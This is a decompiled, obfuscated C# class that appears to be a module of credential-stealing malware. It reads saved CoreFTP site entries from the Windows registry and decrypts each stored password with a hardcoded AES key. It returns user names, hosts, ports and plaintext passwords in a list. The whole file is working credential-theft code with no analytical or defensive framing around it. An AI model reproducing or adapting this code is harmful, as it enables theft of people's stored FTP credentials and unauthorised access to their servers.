using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class ZTFEpdjP8zw : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string Tv1
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public ZTFEpdjP8zw()
	{
		Tv1 = "CoreFTP";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] subKeyNames = default;
		RegistryKey registryKey = default;
		string text = default;
		int num2 = default;
		List<ii68> list = default;
		string text2 = default;
		while (true)
		{
			if (num == 5)
			{
				subKeyNames = registryKey.GetSubKeyNames();
				num = 6;
			}
			if (num == 3)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(text);
				num = 4;
			}
			if (num == 8)
			{
				goto IL_0072;
			}
			goto IL_0088;
			IL_0088:
			if (num == 2)
			{
				text = "SOFTWARE\\FTPWare\\COREFTP\\Sites";
				num = 3;
			}
			if (num == 6)
			{
				num2 = 0;
				num = 7;
			}
			if (num != 7)
			{
				if (num == 1)
				{
					list = new List<ii68>();
					num = 2;
				}
				if (num == 4)
				{
					if (registryKey == null)
					{
						break;
					}
					num = 5;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num != 9)
				{
					continue;
				}
				try
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text + "\\" + text2);
					if (registryKey2 != null)
					{
						byte[] array = b4v.H4VWdV77v((string)registryKey2.GetValue("PW"));
						list.Add(new ii68
						{
							oVAe = Tv1,
							S8v = (string)registryKey2.GetValue("User"),
							byIdLuuGZbL = (string)registryKey2.GetValue("Host") + (string)registryKey2.GetValue("Port"),
							_9H5rP7hg2 = uuSDARWKb(array)
						});
					}
				}
				catch
				{
				}
				num2++;
			}
			if (num2 >= subKeyNames.Length)
			{
				break;
			}
			goto IL_0072;
			IL_0072:
			text2 = subKeyNames[num2];
			num = 9;
			goto IL_0088;
		}
		return list;
	}

	private string uuSDARWKb(byte[] _1KdNCm6F)
	{
		int num = 0;
		byte[] bytes = default;
		RijndaelManaged rijndaelManaged = default;
		do
		{
			if (num == 1)
			{
				bytes = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");
				num = 2;
			}
			if (num == 2)
			{
				rijndaelManaged = new RijndaelManaged();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			rijndaelManaged.Mode = CipherMode.ECB;
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.BlockSize = 128;
			RijndaelManaged rijndaelManaged2 = rijndaelManaged;
			byte[] iV = new byte[16];
			rijndaelManaged2.IV = iV;
			byte[] bytes2 = rijndaelManaged.CreateDecryptor().TransformFinalBlock(_1KdNCm6F, 0, _1KdNCm6F.Length);
			return Encoding.UTF8.GetString(bytes2);
		}
		catch (Exception ex)
		{
			throw new Exception(ex.ToString());
		}
		finally
		{
			((IDisposable)rijndaelManaged)?.Dispose();
		}
	}
}
